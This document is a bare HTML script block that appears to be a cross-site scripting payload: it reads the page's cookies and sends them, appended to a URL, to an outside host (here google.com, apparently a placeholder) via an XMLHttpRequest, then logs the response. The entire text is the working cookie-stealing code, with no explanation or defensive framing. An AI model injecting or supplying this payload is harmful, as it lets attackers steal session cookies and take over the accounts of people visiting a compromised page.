<script>
  var c = document.cookie;
  const Http = new XMLHttpRequest();
  var url_destino = 'https://google.com/' + c;
  const url= url_destino;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText)
  }
</script>
